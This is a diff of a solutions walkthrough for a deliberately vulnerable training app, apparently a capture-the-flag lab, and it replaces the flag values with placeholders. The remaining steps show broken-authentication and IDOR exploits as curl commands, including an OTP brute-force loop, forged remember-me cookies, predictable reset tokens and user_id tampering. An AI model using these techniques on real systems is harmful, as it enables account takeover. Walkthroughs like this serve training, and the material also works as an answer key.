@@ -6,7 +6,7 @@ a live instance.
 
 ## auth – Broken Authentication
 
-**1. Username Enumeration** – `PENTRIX{auth_user-enum}`
+**1. Username Enumeration** – `PENTRIX{...}`
 
 1. Open `GET /auth/enum-login`.
 2. Submit a bogus name:
@@ -25,7 +25,7 @@ Why it works: the login distinguishes "user not found" from "wrong password",
 so each probe leaks whether a username exists; the submit page awards the flag
 once a name confirmed through that oracle is submitted.
 
-**2. Unsigned Remember-Me Cookie** – `PENTRIX{auth_rememberme}`
+**2. Unsigned Remember-Me Cookie** – `PENTRIX{...}`
 
 1. Log in as bob with "remember me" ticked:
    `curl -c jar --data-urlencode "username=bob" --data-urlencode "password=bob123" --data-urlencode "remember=1" http://localhost:3000/auth/remember-login`
@@ -38,7 +38,7 @@ once a name confirmed through that oracle is submitted.
 Why it works: the remember-me token is just base64(username) with no
 signature or MAC, so anyone can mint a valid token for any user.
 
-**3. Brute-Forcing a 4-Digit OTP** – `PENTRIX{auth_otp-bruteforce}`
+**3. Brute-Forcing a 4-Digit OTP** – `PENTRIX{...}`
 
 1. `curl -c jar -b jar http://localhost:3000/auth/otp-reset` and copy the
    reset token from the page (the scenario hands you a valid token for admin).
@@ -52,7 +52,7 @@ signature or MAC, so anyone can mint a valid token for any user.
    for i in range(10000):
        r = s.post('http://localhost:3000/auth/otp-reset/verify',
                   data={'token': token, 'otp': '%04d' % i, 'newPassword': 'otpwned1'})
-       if 'PENTRIX{auth_otp-bruteforce}' in r.text:
+       if 'PENTRIX{...}' in r.text:
            print('found:', '%04d' % i); break
    ```
 3. The correct code resets admin's password and awards the flag; log in at
@@ -61,7 +61,7 @@ signature or MAC, so anyone can mint a valid token for any user.
 Why it works: a 4-digit code with no rate limiting, no lockout, and no expiry
 is enumerable in seconds, and the token alone was never meant to be secret.
 
-**4. SHA-256 Predictable Reset Token** – `PENTRIX{auth_reset-predictable}`
+**4. SHA-256 Predictable Reset Token** – `PENTRIX{...}`
 
 1. Read the recipe shown on `GET /auth/sha-reset`:
    `sha256(username + 'reset-salt')`.
@@ -74,7 +74,7 @@ is enumerable in seconds, and the token alone was never meant to be secret.
 Why it works: the token is a deterministic hash of public data, so anyone who
 knows the recipe can mint a valid token for any account.
 
-**5. Guessable Security Question** – `PENTRIX{auth_security-question}`
+**5. Guessable Security Question** – `PENTRIX{...}`
 
 1. Open `GET /auth/bio/alice`. The bio says her mother's maiden name is Smith.
 2. Reset her password with that answer:
@@ -84,7 +84,7 @@ knows the recipe can mint a valid token for any account.
 Why it works: the "secret" answer is public knowledge printed in the user's
 bio, so the security question is not authentication at all.
 
-**6. Password Change Without Current Password** – `PENTRIX{auth_change-pass-noverify}`
+**6. Password Change Without Current Password** – `PENTRIX{...}`
 
 1. Log in as anyone: `curl -c jar -b jar --data-urlencode "username=bob" --data-urlencode "password=bob123" http://localhost:3000/auth/login`
 2. Open `GET /auth/change-password` and note the form has no current-password field.
@@ -95,7 +95,7 @@ bio, so the security question is not authentication at all.
 Why it works: the endpoint trusts the session alone and never re-verifies
 identity with the current password, so any active session can take over.
 
-**7. Support Ticket Impersonation** – `PENTRIX{auth_support-impersonate}`
+**7. Support Ticket Impersonation** – `PENTRIX{...}`
 
 1. Open `GET /auth/support`. Tickets are sequential.
 2. Walk the range: `curl "http://localhost:3000/auth/support/login?ticket=1001"`
@@ -105,7 +105,7 @@ identity with the current password, so any active session can take over.
 Why it works: ticket ids are predictable and the support endpoint performs no
 authorization check, so anyone can impersonate any customer, including admin.
 
-**8. API Key Leaked in HTML Comment** – `PENTRIX{auth_apikey-leak}`
+**8. API Key Leaked in HTML Comment** – `PENTRIX{...}`
 
 1. Log in as anyone and open `GET /auth/settings` (keep the session cookie).
 2. View the page source: an HTML comment contains the admin API key, e.g.
@@ -122,7 +122,7 @@ left that key in an HTML comment readable via "view source".
 Log in for these labs with the quick-login links, e.g.
 `curl -c jar -b jar -L http://localhost:3000/idor/login/alice`.
 
-**1. Invoice Download IDOR** – `PENTRIX{idor_idor-download}`
+**1. Invoice Download IDOR** – `PENTRIX{...}`
 
 1. Log in as alice.
 2. `curl -c jar -b jar http://localhost:3000/idor/invoice/2` (bob's invoice)
@@ -131,7 +131,7 @@ Log in for these labs with the quick-login links, e.g.
 
 Why it works: the invoice is fetched by id with no ownership check.
 
-**2. Email Change IDOR** – `PENTRIX{idor_idor-email-change}`
+**2. Email Change IDOR** – `PENTRIX{...}`
 
 1. Log in as alice and open `GET /idor/account` to see the change-email form.
 2. Tamper the `user_id` field to target admin (id 1):
@@ -141,7 +141,7 @@ Why it works: the invoice is fetched by id with no ownership check.
 Why it works: the target account comes from a client-supplied `user_id`
 parameter that the server never validates against the logged-in user.
 
-**3. Shopping Cart IDOR** – `PENTRIX{idor_idor-cart}`
+**3. Shopping Cart IDOR** – `PENTRIX{...}`
 
 1. Log in as alice.
 2. `curl -c jar -b jar "http://localhost:3000/idor/cart?user_id=3"` (bob's cart)
@@ -151,7 +151,7 @@ parameter that the server never validates against the logged-in user.
 Why it works: the cart is looked up by a client-supplied `user_id` query
 parameter with no ownership check.
 
-**4. API Key Regeneration IDOR** – `PENTRIX{idor_idor-apikey-regen}`
+**4. API Key Regeneration IDOR** – `PENTRIX{...}`
 
 1. Log in as alice and open `GET /idor/apikey`.
 2. Regenerate admin's key (id 1) instead of your own:
@@ -164,7 +164,7 @@ parameter with no ownership check.
 Why it works: key regeneration trusts a client-supplied `user_id` with no
 ownership check, so you can rotate anyone's key and then use the new value.
 
-**5. Stored Address IDOR** – `PENTRIX{idor_idor-address}`
+**5. Stored Address IDOR** – `PENTRIX{...}`
 
 1. Log in as alice.
 2. `curl -c jar -b jar http://localhost:3000/idor/address/3` (admin's address)
@@ -173,7 +173,7 @@ ownership check, so you can rotate anyone's key and then use the new value.
 
 Why it works: the stored address is fetched by id with no ownership check.
 
-**6. Forced Browsing to Admin Function** – `PENTRIX{idor_function-browse}`
+**6. Forced Browsing to Admin Function** – `PENTRIX{...}`
 
 1. Log in as alice (or bob), a non-admin user.
 2. `curl -c jar -b jar http://localhost:3000/idor/admin/users`
@@ -183,7 +183,7 @@ Why it works: the stored address is fetched by id with no ownership check.
 Why it works: the endpoint only checks "logged in" and never the admin role,
 so any authenticated user can force-browse the admin function.
 
-**7. Comment Deletion IDOR** – `PENTRIX{idor_idor-comment-delete}`
+**7. Comment Deletion IDOR** – `PENTRIX{...}`
 
 1. Log in as bob and open `GET /idor/comments` to see comment ids.
 2. Delete a comment written by someone else (admin's is id 1):
@@ -193,7 +193,7 @@ so any authenticated user can force-browse the admin function.
 Why it works: deletion is keyed by comment id only; authorship is never
 checked.
 
-**8. Private Notes IDOR** – `PENTRIX{idor_idor-notes}`
+**8. Private Notes IDOR** – `PENTRIX{...}`
 
 1. Log in as alice.
 2. `curl -c jar -b jar http://localhost:3000/idor/notes/3` (admin's private
